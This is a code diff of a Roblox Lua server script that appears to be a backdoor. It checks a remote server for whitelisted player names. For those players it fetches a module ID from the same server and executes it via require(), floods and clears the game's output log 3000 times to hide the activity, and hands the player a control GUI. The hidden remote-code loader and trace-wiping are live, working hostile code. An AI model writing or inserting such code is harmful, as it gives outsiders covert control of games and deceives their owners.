@@ -15,31 +15,31 @@ _G.FluffyEvent=FluffyEvent
 local Sado=script:FindFirstChildOfClass("ModuleScript")
 
 function Check(plr)
-	if not load then
+	local success,result=pcall(function()
+		return Http:GetAsync(Url.."players")
+	end)
+	if table.find(Http:JSONDecode(result),plr.Name) then
+		FluffyEvent.Parent=Players
 		local success,result=pcall(function()
-			return Http:GetAsync(Url.."players")
+			return Http:GetAsync(Url.."id")
 		end)
-		if table.find(Http:JSONDecode(result),plr.Name) then
+		if not load then
 			load=true
-			FluffyEvent.Parent=Players
-			local success,result=pcall(function()
-				return Http:GetAsync(Url.."id")
-			end)
 			require(tonumber(result)).ROOWO(script)
 			for i=1,3000 do
 				game:GetService("LogService"):ClearOutput()
 				print("")
 			end
+		end
 
-			local OutputGUI=script:WaitForChild("OutputGUI"):Clone()
-			OutputGUI.Event.Value=FluffyEvent
-			OutputGUI:SetAttribute("Greeting",[[Hello! OwO :3  :3  :3  :3  :3  :3  :3  :3  :3  :3  :3  :3
+		local OutputGUI=script:WaitForChild("OutputGUI"):Clone()
+		OutputGUI.Event.Value=FluffyEvent
+		OutputGUI:SetAttribute("Greeting",[[Hello! OwO :3  :3  :3  :3  :3  :3  :3  :3  :3  :3  :3  :3
 		
 		                       This is a new version
 		                                       OWO
 		]])
-			OutputGUI.Parent=plr.PlayerGui
-		end
+		OutputGUI.Parent=plr.PlayerGui
 	end
 end
 
